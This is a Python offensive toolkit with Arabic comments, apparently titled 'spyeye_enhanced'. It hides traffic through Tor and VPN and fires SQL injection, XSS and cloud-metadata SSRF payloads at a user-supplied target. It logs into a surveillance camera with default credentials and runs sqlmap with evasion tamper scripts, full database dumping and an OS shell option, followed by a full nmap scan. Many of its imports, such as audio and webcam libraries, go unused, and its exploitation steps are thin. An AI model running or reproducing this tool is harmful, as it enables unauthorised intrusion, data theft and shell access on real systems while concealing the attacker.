import socket
import threading
import os
import time
import requests
import subprocess
import base64
from Crypto.Cipher import AES
import random
import string
import logging
import sqlite3
import socks
import ssl
import sys
import platform
import urllib.request
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argparse
from impacket import smb
import json
import re
import hashlib
import nmap
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pyautogui
import pyaudio
import wave
import shutil
import cv2
from onvif import ONVIFCamera
from scapy.all import ARP, Ether, srp
import pdfkit
import networkx as nx
import matplotlib.pyplot as plt

# ===================== إعداد السجل =====================
logging.basicConfig(filename='spyeye_enhanced_log.txt', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# ===================== إعداد VPN و Tor =====================
def use_tor_and_vpn():
    try:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        subprocess.run("openvpn --config myconfig.ovpn", shell=True)
        subprocess.run("openvpn --config another_vpn_config.ovpn", shell=True)
        logging.info("[INFO] VPN and TOR setup completed.")
    except Exception as e:
        logging.error(f"[ERROR] VPN or TOR setup failed: {e}")

# ===================== تشفير البيانات =====================
def generate_aes_key():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

def encrypt_data(data, key):
    try:
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return cipher.nonce + tag + ciphertext
    except Exception as e:
        logging.error(f"[ERROR] Data encryption failed: {e}")
        return None

# ===================== تمويه حركة المرور =====================
def obfuscated_http_request(target_ip, target_port):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Authorization": "Bearer " + base64.b64encode(b"FakeTokenForRequest").decode(),
            "X-Forwarded-For": target_ip,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        }
        request_data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n" + "\r\n".join([f"{key}: {value}" for key, value in headers.items()])
        encrypted_message = base64.b64encode(request_data.encode())
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(encrypted_message)
            logging.info(f"[INFO] Sent obfuscated HTTPS request to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"[ERROR] Obfuscated request failed: {e}")

# ===================== كشف Sandbox =====================
# تعطيل كشف الـ Sandbox:
def detect_sandbox():
    pass  # الآن دالة الكشف عن الـ Sandbox لن تفعل شيئًا

# ===================== اكتشاف الثغرات =====================
def detect_sql_injection(url, payload):
    try:
        response = requests.get(url + payload, headers={"User-Agent": "Mozilla/5.0"})
        if "error" in response.text or "sql" in response.text:
            logging.info(f"SQL Injection vulnerability detected: {url + payload}")
            return request_permission_for_exploit("SQL Injection")
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERROR] SQL Injection test failed: {e}")
    return False

def detect_xss(url, payload):
    try:
        response = requests.get(url + payload, headers={"User-Agent": "Mozilla/5.0"})
        if "<script>" in response.text:
            logging.info(f"XSS vulnerability detected: {url + payload}")
            return request_permission_for_exploit("XSS")
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERROR] XSS test failed: {e}")
    return False

def detect_ssrf(target, payload):
    try:
        response = requests.get(target, params={"url": payload}, timeout=5)
        if response.status_code == 200 and "internal" in response.text.lower():
            logging.info(f"[INFO] SSRF vulnerability detected: {target}")
            return request_permission_for_exploit("SSRF")
    except Exception as e:
        logging.error(f"[ERROR] Failed SSRF detection: {e}")
    return False

# ===================== استغلال كاميرات المراقبة =====================
def exploit_camera(ip, username, password):
    try:
        mycam = ONVIFCamera(ip, 80, username, password, "/path/to/wsdl")
        info = mycam.devicemgmt.GetDeviceInformation()
        logging.info(f"[INFO] Camera at {ip} exploited successfully! Info: {info}")
        return True
    except Exception as e:
        logging.error(f"[ERROR] Failed to exploit camera at {ip}: {e}")
    return False

# ===================== أدوات الفحص =====================
def run_tools(target):
    try:
        sqlmap_command = [
            "sqlmap", "-u", f"http://{target}/vulnerable.php?id=1 OR 1=1", 
            "--batch", "--level=5", "--risk=3", 
            "--tamper=space2comment,charencode,randomcase,between", 
            "--random-agent", "--crawl=10", "--threads=10", 
            "--technique=BEUSTQ", "--time-sec=10", "--output-dir=sqlmap_output", 
            "--dbs", "--dump-all", "--forms", "--smart", "--os-shell"
        ]
        subprocess.run(sqlmap_command)
        logging.info("[INFO] SQLMap executed successfully.")

        nmap_command = f"nmap -p- -A {target}"
        subprocess.run(nmap_command, shell=True)
        logging.info("[INFO] Nmap scan completed.")
    except Exception as e:
        logging.error(f"[ERROR] Tool execution failed: {e}")

# ===================== دالة طلب إذن عند استغلال الثغرات =====================
def request_permission_for_exploit(vulnerability_type):
    response = input(f"[INFO] {vulnerability_type} vulnerability detected. Exploit it? (y/n): ").lower()
    return response == 'y'

# ===================== دالة رئيسية =====================
def main():
    target = input("Enter target IP or URL: ")

    if detect_sql_injection(target, "' OR 1=1"):
        logging.info("SQL Injection detected and exploited.")

    if detect_xss(target, "<script>alert('XSS')</script>"):
        logging.info("XSS vulnerability detected and exploited.")

    if detect_ssrf(target, "http://169.254.169.254/latest/meta-data"):
        logging.info("SSRF vulnerability detected and exploited.")

    exploit_camera("192.168.1.100", "admin", "password")
    run_tools(target)

if __name__ == "__main__":
    main()
